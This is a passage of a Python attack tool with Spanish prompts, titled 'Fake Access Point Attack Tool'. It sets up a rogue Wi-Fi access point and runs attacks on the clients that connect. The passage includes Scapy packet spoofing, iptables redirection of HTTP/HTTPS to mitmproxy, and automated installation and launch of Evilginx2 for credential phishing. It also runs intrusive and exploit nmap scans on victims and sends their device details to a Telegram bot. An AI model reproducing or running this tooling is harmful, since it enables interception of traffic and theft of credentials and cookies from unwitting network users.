    if filter_expr and extra_filter:
        filter_expr = f"({filter_expr}) and ({extra_filter})"
    elif not filter_expr and extra_filter:
        filter_expr = extra_filter

    timeout_str = input("Ingrese el tiempo de captura en segundos (por defecto 30): ").strip()
    try:
        timeout = int(timeout_str) if timeout_str else 30
    except ValueError:
        print("[-] Tiempo no válido, usando 30 segundos.")
        timeout = 30

    print(f"[+] Capturando paquete en {iface} por {timeout} segundos...")
    packets = sniff(iface=iface, filter=filter_expr, count=1, timeout=timeout)
    if not packets:
        print("[-] No se capturó ningún paquete.")
        return

    pkt = packets[0]
    print("\n[+] Paquete original:")
    pkt.show()

    # Mostrar información de las direcciones IP y MAC capturadas, si la capa existe
    if IP in pkt:
        print(f"[+] IP de origen capturada: {pkt[IP].src}")
        print(f"[+] IP de destino capturada: {pkt[IP].dst}")
    if pkt.haslayer(Ether):
        print(f"[+] MAC de origen capturada: {pkt[Ether].src}")
        print(f"[+] MAC de destino capturada: {pkt[Ether].dst}")
    
    # 3. Modificar campos de la capa IP (TTL y direcciones IP)
    if IP in pkt:
        if input("¿Desea modificar el TTL? (s/n): ").strip().lower() == "s":
            try:
                new_ttl = int(input("Ingrese el nuevo valor para TTL: ").strip())
                original_ttl = pkt[IP].ttl
                pkt[IP].ttl = new_ttl
                print(f"[+] TTL modificado: {original_ttl} -> {new_ttl}")
            except Exception as e:
                print("[-] Error al modificar TTL:", e)
        if input("¿Desea modificar las direcciones IP? (s/n): ").strip().lower() == "s":
            new_src = input("Ingrese la nueva IP de origen (dejar en blanco para mantener la actual): ").strip()
            new_dst = input("Ingrese la nueva IP de destino (dejar en blanco para mantener la actual): ").strip()
            if new_src:
                original_src = pkt[IP].src
                pkt[IP].src = new_src
                print(f"[+] IP de origen modificada: {original_src} -> {new_src}")
            if new_dst:
                original_dst = pkt[IP].dst
                pkt[IP].dst = new_dst
                print(f"[+] IP de destino modificada: {original_dst} -> {new_dst}")
            # Forzar recálculo de longitud y checksum
            del pkt[IP].len
            del pkt[IP].chksum
            if TCP in pkt:
                del pkt[TCP].chksum
    else:
        print("[-] El paquete no tiene capa IP, no se pueden modificar sus campos.")

    # 4. Modificar la dirección MAC (si la capa Ether existe)
    if pkt.haslayer(Ether):
        if input("¿Desea modificar las direcciones MAC? (s/n): ").strip().lower() == "s":
            new_mac_src = input("Ingrese la nueva MAC de origen (dejar en blanco para mantener la actual): ").strip()
            new_mac_dst = input("Ingrese la nueva MAC de destino (dejar en blanco para mantener la actual): ").strip()
            if new_mac_src:
                original_mac_src = pkt[Ether].src
                pkt[Ether].src = new_mac_src
                print(f"[+] MAC de origen modificada: {original_mac_src} -> {new_mac_src}")
            if new_mac_dst:
                original_mac_dst = pkt[Ether].dst
                pkt[Ether].dst = new_mac_dst
                print(f"[+] MAC de destino modificada: {original_mac_dst} -> {new_mac_dst}")
    else:
        print("[-] El paquete no tiene capa Ethernet, no se pueden modificar las direcciones MAC.")

    # 5. Modificar el payload
    if input("¿Desea modificar el payload? (s/n): ").strip().lower() == "s":
        if Raw in pkt:
            original_payload = pkt[Raw].load
            print(f"[+] Payload original: {original_payload}")
        else:
            print("[-] El paquete no tiene capa Raw, se agregará una nueva capa Raw.")
            original_payload = b""
        new_payload_text = input("Ingrese el nuevo payload (texto, se convertirá a bytes): ")
        if new_payload_text:
            new_payload = new_payload_text.encode()
            if Raw in pkt:
                pkt[Raw].load = new_payload
            else:
                pkt = pkt / new_payload
            # Eliminar campos para que se recalcule longitud y checksum
            if IP in pkt:
                del pkt[IP].len
                del pkt[IP].chksum
            if TCP in pkt:
                del pkt[TCP].chksum
            print("[+] Payload modificado.")
        else:
            print("[-] No se ingresó nuevo payload, se mantiene el original.")
    else:
        print("[-] No se modificará el payload.")

    print("\n[+] Paquete modificado:")
    pkt.show()

    if input("¿Desea enviar el paquete manipulado? (s/n): ").strip().lower() == "s":
        send(pkt)
        print("[+] Paquete manipulado enviado.")
    else:
        print("[-] Envío cancelado.")




        


def aplicar_redireccion_iptables(listen_port=8080):
    print("[+] Aplicando reglas iptables para redirigir tráfico HTTP y HTTPS...")
    cmd = (
        f"sudo iptables -t nat -A PREROUTING -p tcp --dport 80 -j REDIRECT --to-port {listen_port} ; "
        f"sudo iptables -t nat -A PREROUTING -p tcp --dport 443 -j REDIRECT --to-port {listen_port}"
    )
    subprocess.run(cmd, shell=True, check=False)


        
def start_proxy_mitm_attack():
    iface = seleccionar_interfaz()
    if iface is None:
        print("[-] No se ha seleccionado una interfaz para mitmproxy.")
        return

    ip_address = get_interface_ip(iface)
    if ip_address is None:
        print("[-] No se pudo obtener la IP de la interfaz.")
        return

    # Aplica la redirección para capturar tráfico HTTP
    aplicar_redireccion_iptables(listen_port=8080)

    print(f"[+] Iniciando mitmproxy en la IP {ip_address} (interfaz {iface}). Se abrirá una nueva ventana de terminal.")
    try:
        cmd = f"gnome-terminal -- bash -c 'sudo mitmproxy --intercept \"\" --listen-host {ip_address}; exec bash'"
        proc = subprocess.Popen(cmd, shell=True)
        input("Presiona ENTER para detener mitmproxy...")
        proc.terminate()
        proc.wait(timeout=5)
        print("[+] mitmproxy detenido.")
    except Exception as e:
        print("[-] Error al iniciar mitmproxy:", e)


def instalar_evilginx2():
    import os
    import subprocess

    # Verificar si Evilginx2 ya está instalado (buscando el comando 'evilginx2')
    try:
        result = subprocess.run(["which", "evilginx2"], capture_output=True, text=True)
        if result.stdout.strip():
            print("[+] Evilginx2 ya está instalado.")
            return
    except Exception as e:
        print("[-] Error al verificar Evilginx2:", e)
    
    print("[+] Instalando dependencias para Evilginx2 (golang-go y git)...")
    subprocess.run(["sudo", "apt", "install", "-y", "golang-go", "git"], check=True)
    
    # Clonar o actualizar el repositorio en la versión v3.3.0
    if os.path.exists("evilginx2"):
        print("[+] Actualizando el repositorio de Evilginx2...")
        os.chdir("evilginx2")
        subprocess.run("git fetch --all", shell=True, check=True)
        subprocess.run("git checkout v3.3.0", shell=True, check=True)
        subprocess.run("git pull origin v3.3.0", shell=True, check=True)
    else:
        print("[+] Clonando el repositorio de Evilginx2 (v3.3.0)...")
        subprocess.run("git clone --branch v3.3.0 --depth 1 https://github.com/kgretzky/evilginx2.git", shell=True, check=True)
        os.chdir("evilginx2")
    
    print("[+] Compilando Evilginx2...")
    subprocess.run("make clean && make", shell=True, check=True)
    
    # Buscar el binario en rutas conocidas
    binary_path = None
    posibles_rutas = [
        "evilginx2", 
        "evilginx", 
        os.path.join("build", "evilginx2"), 
        os.path.join("build", "evilginx")
    ]
    for path in posibles_rutas:
        if os.path.exists(path) and os.access(path, os.X_OK):
            binary_path = path
            break

    if not binary_path:
        print("[-] No se encontró el binario de Evilginx2. Verifique la compilación.")
        return

    print(f"[+] Se encontró el binario en: {binary_path}")
    print("[+] Instalando Evilginx2 en /usr/local/bin/evilginx2...")
    subprocess.run(f"sudo cp {binary_path} /usr/local/bin/evilginx2", shell=True, check=True)
    
    os.chdir("..")
    print("[+] Instalación de Evilginx2 completada.")


        
        
def start_advanced_mitm_attack():


    # Solicitar el dominio (opcional)
    domain = input("Ingrese el dominio (opcional) a configurar en Evilginx2: ").strip()
    # Solicitar la IP externa (opcional)
    external_ip = input("Ingrese la IP externa (opcional) de este servidor: ").strip()

    # Solicitar la ruta del directorio de phishlets (esencial)
    phishlets_path = input("Ingrese la ruta del directorio de phishlets de Evilginx2 (por defecto /etc/evilginx2/phishlets): ").strip()
    if not phishlets_path:
        phishlets_path = "/etc/evilginx2/phishlets"
        print("[+] Usando ruta por defecto para phishlets:", phishlets_path)
    # Verificar que el directorio de phishlets exista
    if not os.path.isdir(phishlets_path):
        print("[-] El directorio de phishlets no existe: " + phishlets_path)
        return

    # Solicitar la ruta del directorio de configuración (opcional)
    config_path = input("Ingrese la ruta del directorio de configuración de Evilginx2 (opcional): ").strip()

    print("\n[+] Instrucciones para la shell interactiva de Evilginx2:")
    if domain:
        print("    - Agregar el dominio con: config domain " + domain)
    if external_ip:
        print("    - Configurar la IP externa con: config ipv4 external " + external_ip)
    print("    - Verifique que los phishlets estén correctamente ubicados en: " + phishlets_path)
    print("\n[+] Iniciando Evilginx2 en una nueva ventana de terminal...\n")

    try:
        # Construir el comando: se incluye -c solo si se proporcionó config_path
        if config_path:
            cmd = f"gnome-terminal -- bash -c 'sudo evilginx2 -c {config_path} -p {phishlets_path}; exec bash'"
        else:
            cmd = f"gnome-terminal -- bash -c 'sudo evilginx2 -p {phishlets_path}; exec bash'"
        proc = subprocess.Popen(cmd, shell=True)
        input("Presiona ENTER para detener Evilginx2...")
        proc.terminate()
        proc.wait(timeout=5)
        print("[+] Evilginx2 detenido.")
    except Exception as e:
        print("[-] Error al iniciar Evilginx2:", e)



def start_mitm_menu():
    while True:
        print("""
Seleccione el tipo de ataque MITM:
  1) ARP Spoofing (Bettercap)
  2) DNS Spoofing (Ettercap, modo GUI con caplet)
  3) Proxy MITM (mitmproxy)
  4) Ataque MITM avanzado (Evilginx2)
  5) Volver al menú principal
""")
        opcion = input("Ingrese la opción: ").strip()
        if opcion == "1":
            start_mitm_attack()
        elif opcion == "2":
            start_dns_spoof_attack()
        elif opcion == "3":
            start_proxy_mitm_attack()
        elif opcion == "4":
            start_advanced_mitm_attack()
        elif opcion == "5":
            break
        else:
            print("[-] Opción inválida, intente de nuevo.\n")       
        
        
def escanear_vulnerabilidades():
    import subprocess

    # Definir las categorías NSE disponibles
    available_categories = {
        "1": "auth",
        "2": "broadcast",
        "3": "default",
        "4": "discovery",
        "5": "dos",
        "6": "exploit",
        "7": "external",
        "8": "intrusive",
        "9": "malware",
        "10": "safe",
        "11": "version",
        "12": "vuln"
    }
    
    print("\n[Escaneo de Vulnerabilidades Personalizado]")
    print("Seleccione las categorías NSE que desea incluir en el escaneo:")
    for num, cat in sorted(available_categories.items(), key=lambda x: int(x[0])):
        print(f"  {num}) {cat}")

    print("\n[Advertencia]")
    print("Un escaneo con muchas categorías puede aumentar considerablemente el tiempo de escaneo, incluso afectar la estabilidad del host objetivo.")
    input_categories = input("Ingrese los números separados por comas (por defecto 3,12): ").strip()
    if not input_categories:
        selected = ["default", "vuln"]
    else:
        numbers = [x.strip() for x in input_categories.split(",")]
        selected = [available_categories[num] for num in numbers if num in available_categories]
        if not selected:
            selected = ["default", "vuln"]
    categories_str = ",".join(selected)
    print(f"[+] Se seleccionaron las categorías: {categories_str}")
    
    # Para cada categoría seleccionada, preguntar si se desean agregar argumentos
    print("\n[Información]")
    print("Para cada categoría, puede ingresar argumentos adicionales en formato key=value, separados por comas. Ejemplo: vulns.showall=1, auth.timeout=5")
    print("Consulte la documentación NSE en: https://nmap.org/nsedoc/ para más detalles.\n")
    script_args_list = []
    for cat in selected:
        default_prompt = " (por defecto: vulns.showall=1)" if cat == "vuln" else ""
        user_args = input(f"Ingrese argumentos para la categoría '{cat}'{default_prompt} (o presione Enter para omitir): ").strip()
        if not user_args and cat == "vuln":
            user_args = "vulns.showall=1"
        if user_args:
            script_args_list.append(user_args)
    script_args_str = ",".join(script_args_list)
    print(f"[+] Se usarán los siguientes argumentos NSE: {script_args_str}")
    
    # Obtener dispositivos conectados (se supone que get_connected_stations() está definida en tu script)
    devices = get_connected_stations()
    if not devices:
        print("[-] No se encontraron dispositivos conectados.")
        return

    print("\n[+] Dispositivos conectados:")
    for idx, dev in enumerate(devices, start=1):
        ip = dev.get("IP", "N/A")
        mac = dev.get("MAC", "N/A")
        hostname = dev.get("hostname", "N/A")
        print(f"  [{idx}] IP: {ip} | MAC: {mac} | Hostname: {hostname}")

    try:
        choice = int(input("\nSeleccione el dispositivo a escanear (por número): ").strip())
        target = devices[choice - 1].get("IP")
        if not target:
            print("[-] El dispositivo seleccionado no tiene una IP válida.")
            return
    except Exception as e:
        print("[-] Selección inválida:", e)
        return

    use_pn = input("¿Desea usar la opción -Pn para omitir el ping scan? (s/n, por defecto s): ").strip().lower()
    pn_flag = "-Pn" if use_pn != "n" else ""

    print(f"\n[+] Ejecutando escaneo de vulnerabilidades en {target} usando nmap...")
    # Construir el comando nmap con las categorías y argumentos seleccionados
    nmap_cmd = f"sudo nmap {pn_flag} -sV -O --script \"{categories_str}\" --script-args \"{script_args_str}\" {target}"
    try:
        result = subprocess.run(nmap_cmd, shell=True, capture_output=True, text=True)
        print("[+] Resultado del escaneo:")
        print(result.stdout)
        if result.stderr:
            print("\n[!] Errores durante el escaneo:")
            print(result.stderr)
    except Exception as e:
        print("[-] Error al ejecutar nmap:", e)


def generar_reporte():
    import csv
    import datetime
    import os

    print("\n[GENERAR REPORTE]")
    attack_type = input("Ingrese el tipo de ataque (ej: Fake AP, MITM, etc.): ").strip()
    description = input("Ingrese una descripción breve del ataque: ").strip()
    result = input("Ingrese el resultado obtenido (credenciales, cookies, etc.): ").strip()
    timestamp = datetime.datetime.now().strftime("%Y-%m-%d %H:%M:%S")
    
    filename = input("Ingrese el nombre del reporte (sin extensión, se usará .csv): ").strip()
    if not filename:
        filename = "reporte"
    filename = filename + ".csv"
    
    file_exists = os.path.isfile(filename)
    try:
        with open(filename, mode='a', newline='') as file:
            writer = csv.writer(file)
            if not file_exists:
                writer.writerow(["Timestamp", "Attack Type", "Description", "Result"])
            writer.writerow([timestamp, attack_type, description, result])
        print(f"[+] Reporte generado y guardado en {filename}\n")
    except Exception as e:
        print("[-] Error al generar el reporte:", e)


def analizar_reporte():
    import csv
    import os

    print("\n[ANALIZAR REPORTE]")
    filename = input("Ingrese el nombre del reporte CSV a analizar (con .csv): ").strip()
    if not os.path.isfile(filename):
        print("[-] El archivo no existe.\n")
        return
    
    try:
        with open(filename, 'r', newline='') as file:
            reader = csv.DictReader(file)
            rows = list(reader)
            print(f"[+] Se encontraron {len(rows)} registros en {filename}.\n")
            for idx, row in enumerate(rows, start=1):
                print(f"Registro {idx}: {row}")
            print("")
    except Exception as e:
        print("[-] Error al analizar el reporte:", e)


def reportes_menu():
    while True:
        print("""
[REPORTES]
  1) Generar reporte
  2) Analizar reporte
  3) Volver al menú principal
        """)
        opcion = input("Seleccione una opción: ").strip()
        if opcion == "1":
            generar_reporte()
        elif opcion == "2":
            analizar_reporte()
        elif opcion == "3":
            break
        else:
            print("[-] Opción inválida, intente de nuevo.\n")



def instalar_requests():
    import sys, subprocess
    try:
        import requests
    except ImportError:
        print("[+] Instalando requests...")
        result = subprocess.run([sys.executable, "-m", "pip", "install", "requests"], capture_output=True, text=True)
        if result.returncode != 0:
            print("[-] Error al instalar requests:", result.stderr)
            return False
    return True

def start_notificaciones_telegram():
    import time
    try:
        import requests
    except ImportError:
        if not instalar_requests():
            print("[-] No se pudo instalar requests. Abortando notificaciones.")
            return
        import requests

    global notificaciones_thread, notificaciones_stop_event

    print("\n[Notificaciones en Tiempo Real - Telegram para Clientes Conectados]")
    bot_token = input("Ingrese el token del bot de Telegram: ").strip()
    chat_id = input("Ingrese el chat ID: ").strip()
    if not bot_token or not chat_id:
        print("[-] Token y chat ID son requeridos. Abortando notificaciones.")
        return

    # Si ya hay notificaciones corriendo, avisar y salir
    if notificaciones_thread is not None and notificaciones_thread.is_alive():
        print("[*] Las notificaciones ya están en ejecución.")
        return

    notificaciones_stop_event = threading.Event()

    def background_notifications():
        previous_msg = None
        while not notificaciones_stop_event.is_set():
            # Obtener la lista actual de clientes conectados
            clients = get_connected_stations()  # Asume que esta función ya está definida globalmente
            msg = "[Notificaciones Clientes Conectados]\n"
            if clients:
                for client in clients:
                    mac = client.get("MAC", "N/A")
                    ip = client.get("IP", "N/A")
                    hostname = client.get("hostname", "N/A")
                    msg += f"MAC: {mac} | IP: {ip} | Hostname: {hostname}\n"
            else:
                msg += "No hay clientes conectados.\n"
            # Enviar notificación solo si el mensaje cambió
            if msg != previous_msg:
                url = f"https://api.telegram.org/bot{bot_token}/sendMessage"
                data = {"chat_id": chat_id, "text": msg}
                try:
                    response = requests.post(url, data=data)
                    if response.status_code == 200:
                        print("[+] Notificación enviada.")
                    else:
                        print("[-] Error al enviar notificación:", response.text)
                except Exception as e:
                    print("[-] Excepción al enviar notificación:", e)
                previous_msg = msg
            # Esperar 10 segundos (se interrumpe antes si se solicita)
            for _ in range(10):
                if notificaciones_stop_event.is_set():
                    time.sleep(1)
                else:
                    break

    notificaciones_thread = threading.Thread(target=background_notifications, daemon=True)
    notificaciones_thread.start()
    print("[+] Notificaciones iniciadas en segundo plano.\n")
    
def stop_notificaciones_telegram():
    global notificaciones_stop_event, notificaciones_thread
    if notificaciones_thread is not None and notificaciones_thread.is_alive():
        print("[+] Deteniendo notificaciones en segundo plano...")
        notificaciones_stop_event.set()
        notificaciones_thread.join(timeout=5)
        print("[+] Notificaciones detenidas.\n")
    else:
        print("[*] No hay notificaciones en ejecución.\n")

def menu_notificaciones():
    while True:
        print("""
[NOTIFICACIONES TELEGRAM]
  1) Iniciar Notificaciones
  2) Detener Notificaciones
  3) Volver al Menú Principal
        """)
        opcion = input("Seleccione una opción: ").strip()
        if opcion == "1":
            start_notificaciones_telegram()
        elif opcion == "2":
            stop_notificaciones_telegram()
        elif opcion == "3":
            break
        else:
            print("[-] Opción inválida, intente de nuevo.")
            
            
def automatizar_configuracion_red():
    print("[+] Iniciando Automatización de Configuración de Red...")
    interface = seleccionar_interfaz()
    if not interface:
        print("[-] No se encontró una interfaz para configurar la red.")
        return

    # Resetear la interfaz y desactivar servicios en conflicto
    resetear_interfaz(interface)
    
    # Configurar la interfaz en modo AP
    ap_interface = habilitar_modo_ap(interface)
    
    # Asignar una IP estática (por ejemplo, 192.168.1.1/24)
    configurar_red(ap_interface)
    
    # Configurar dnsmasq con rango DHCP y tiempo de lease (ajusta según tus necesidades)
    configurar_dnsmasq(ap_interface, "192.168.1.50,192.168.1.150", "12h")
    
    # Iniciar hostapd para que se levante el AP
    iniciar_hostapd()
    
    # Habilitar NAT para proveer conectividad a Internet a los clientes conectados
    habilitar_nat()
    
    print("[+] Automatización de Configuración de Red completada.\n")         
    
    
def restaurar_configuracion_red():
    import subprocess
    print("[+] Restaurando configuración de red y deteniendo el ataque...")

    # Detener servicios críticos
    subprocess.run("sudo systemctl stop hostapd", shell=True, check=False)
    subprocess.run("sudo systemctl stop dnsmasq", shell=True, check=False)
    subprocess.run("sudo killall -9 wpa_supplicant hostapd dnsmasq", shell=True, check=False)
    
    # Vaciar reglas de iptables (tabla NAT)
    subprocess.run("sudo iptables -t nat -F", shell=True, check=False)
    
    # Restaurar las interfaces inalámbricas a modo Managed
    interfaces = listar_interfaces()
    if interfaces:
        for iface in interfaces:
            print(f"[+] Restaurando la interfaz {iface} a modo Managed...")
            subprocess.run(f"sudo nmcli device set {iface} managed yes", shell=True, check=False)
            subprocess.run(f"sudo ip link set {iface} down", shell=True, check=False)
            subprocess.run(f"sudo iw dev {iface} set type managed", shell=True, check=False)
            subprocess.run(f"sudo ip link set {iface} up", shell=True, check=False)
    else:
        print("[-] No se encontraron interfaces inalámbricas para restaurar.")
    
    # Reiniciar el Network Manager (opcional)
    subprocess.run("sudo systemctl restart NetworkManager", shell=True, check=False)
    print("[+] Configuración de red restaurada. Ataque detenido.\n")       


def ayuda_documentacion():
    print("""
==============================
       AYUDA Y DOCUMENTACIÓN
==============================

Esta herramienta de ataque de AP Fake integra las siguientes funcionalidades:

1) Crear Fake AP:
   - Configura un punto de acceso falso (Fake AP) utilizando hostapd, dnsmasq y NAT.
   - Documentación:
       - Hostapd: https://w1.fi/hostapd/
       - Dnsmasq: http://www.thekelleys.org.uk/dnsmasq/doc.html

2) Ataque MITM:
   - Permite realizar ataques Man-In-The-Middle con Bettercap, DNS spoofing con Ettercap, y Proxy MITM con mitmproxy.
   - Documentación:
       - Bettercap: https://www.bettercap.org/
       - Ettercap: https://ettercap.github.io/ettercap/
       - Mitmproxy: https://mitmproxy.org/
       - Evilginx2: https://github.com/kgretzky/evilginx2

3) Portal de Phishing (Wifiphisher):
   - Despliega escenarios de phishing para obtener credenciales y datos sensibles.
   - Documentación: https://wifiphisher.org/

4) Sniffing, Inyección y Manipulación de paquetes:
   - Permite capturar tráfico pasivo e interactuar con Scapy para análisis, inyección y manipulación de paquetes.
   - Documentación:
       - Tcpdump: https://www.tcpdump.org/
       - Scapy: https://scapy.readthedocs.io/en/latest/usage.html

5) Escaneo de Vulnerabilidades:
   - Utiliza Nmap con scripts NSE para detectar vulnerabilidades en dispositivos conectados.
   - Documentación:
       - Nmap NSE: https://nmap.org/nsedoc/
       - Nmap: https://nmap.org/

6) Monitorear clientes conectados:
   - Muestra en tiempo real los dispositivos conectados al Fake AP.
   
7) Notificaciones en Tiempo Real (Telegram):
   - Envía notificaciones sobre dispositivos conectados mediante un bot de Telegram.
   - Documentación:
       - API de Telegram Bots: https://core.telegram.org/bots/api

8) Generación y Análisis de Reportes:
   - Permite generar reportes en formato CSV y analizarlos posteriormente.

9) Restaurar Configuración de Red:
   - Detiene las herramientas de ataque y restaura la red a su estado original (hostapd, dnsmasq, iptables, etc.).

Para más detalles y ejemplos de uso, consulte la documentación oficial de cada herramienta en los enlaces proporcionados.

Presione ENTER para volver al menú principal...
""")
    input()


def banner():
    print("""
    ==============================
    FAKE ACCESS POINT ATTACK TOOL
    ==============================
    [1] Crear Fake AP
    [2] Ataque MITM
    [3] Portal de Phishing
    [4] Sniffing e Inyeccion
    [5] Scaneo de Vulnerabilidades en Dispositivos Conectados    
    [6] Monitorear clientes conectados
    [7] Notificaciones en Tiempo Real        
    [8] Generación y Análisis de Reportes
    [9] Restaurar Configuración de Red
    [10] Ayuda y Dumentacion
    [11] Salir
    """)        

def main():
    # Comprobando entorno virtual.
    crear_entorno_virtual()
    global ap_interface_global
    instalar_dependencias()
    while True:
        banner()
        opcion = input("Selecciona una opción: ")
        if opcion == "1":
            menu_configuracion_red()
        elif opcion == "2":
            start_mitm_menu()   # Llamamos al submenú de ataques MITM
        elif opcion == "3":
            start_phishing_portal()
        elif opcion == "4":
            sniffing_menu()
        elif opcion == "5":
            escanear_vulnerabilidades()
        elif opcion == "6":
            monitorear_clientes()
        elif opcion == "7":
            menu_notificaciones()
        elif opcion == "8":
            reportes_menu()
        elif opcion == "9":
            restaurar_configuracion_red()
        elif opcion == "10":
            ayuda_documentacion()
        elif opcion == "11":
            print("[+] Saliendo...")
            if ap_interface_global:
                recuperar_interfaz(ap_interface_global)
            try:
                subprocess.run("sudo iptables -t nat -F", shell=True, check=True)
                print("[+] Configuración de iptables restaurada.")
            except Exception as e:
                print("Error al limpiar iptables:", e)
            
            # Restaurar configuraciones de Ettercap solo si existen los backups
            if os.path.exists("/etc/ettercap/etter.conf.bak"):
                subprocess.run("sudo mv /etc/ettercap/etter.conf.bak /etc/ettercap/etter.conf", shell=True, check=False)
                print("[+] Configuración de Ettercap restaurada.")
            else:
                print("[+] No se encontró backup de /etc/ettercap/etter.conf, se omite restauración.")
            
            if os.path.exists("/etc/ettercap/etter.dns.bak"):
                subprocess.run("sudo mv /etc/ettercap/etter.dns.bak /etc/ettercap/etter.dns", shell=True, check=False)
                print("[+] Configuración de Ettercap DNS restaurada.")
            else:
                print("[+] No se encontró backup de /etc/ettercap/etter.dns, se omite restauración.")
                
            # Detener notificaciones si están en ejecución
            stop_notificaciones_telegram()  
            
            # Eliminar el entorno virtual para dejar todo como estaba
            if os.path.exists("venv"):
                print("[+] Eliminando entorno virtual...")
                shutil.rmtree("venv")
            
            break
        else:
            print("[-] Opción inválida, intenta de nuevo.")

if __name__ == "__main__":
    main()
